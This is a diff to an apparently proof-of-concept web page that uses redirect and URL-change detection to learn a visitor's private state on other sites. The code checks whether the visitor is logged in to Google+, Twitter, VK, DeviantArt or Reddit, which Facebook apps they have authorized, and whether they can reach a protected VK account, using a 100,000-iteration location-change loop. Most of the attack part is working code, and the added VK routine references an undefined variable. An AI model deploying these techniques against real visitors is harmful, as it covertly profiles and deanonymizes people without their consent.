@@ -93,6 +93,10 @@ var check_redirect = function(base, cb, assigner){
 var run = function(){
   window.eval(ev.value)
 }
+var direct_history=true; //false in non-webkit 
+var full_debug=true;
+var timeout=10000;
+var data_timeout = 1000;
 
 //window.onload = run;
 
@@ -101,9 +105,9 @@ var run = function(){
 <br><a href=javascript:void(0) onclick="run()">Run</a>
 <br>
 <textarea id="ev" style="width:600px;height:200px;">
-direct_history=true;
-full_debug=true;
-timeout=10000;
+var direct_history=true; //false in non-webkit 
+var full_debug=true;
+var timeout=10000;
 var data_timeout = 1000;
 
 
@@ -113,7 +117,8 @@ var sites = {
   gplus: 'https://plus.google.com/photos/instantupload',
   twitter: 'https://twitter.com/following',
   vk: 'http://vk.com/friends',
-  devianart: 'http://my.deviantart.com/messages/'
+  devianart: 'http://my.deviantart.com/messages/',
+  reddit: 'http://www.reddit.com/message/inbox/'
 }
 var result = {}
 for(var site in sites){
@@ -139,6 +144,17 @@ check_redirect('https://twitter.com/PROTECTED/favorites', function(guess){
 check_redirect('https://www.facebook.com/dialog/oauth?client_id='+(tryapp=prompt('choose app, e.g. 114545895322903'))+'&redirect_uri=https%3A%2F%2Fm.facebook.com', function(guess){
   debug('Authorized app '+tryapp+'  '+(guess ? 'no' : 'yes'));
 })
+
+//vkontakte ID detection
+
+check_redirect('http://m.vk.com/photos', function(guess){
+  debug('Has access to protected account: '+ (guess ? 'yes' : 'no'));
+},function(w){
+  for(var i=0;i<100000;i++){
+    w.location='http://m.vk.com/photos'+tryid+'#';
+  }
+})
+
 </pre>
 <hr/>
 <h1>Clickjacking URL-change detection</h1>
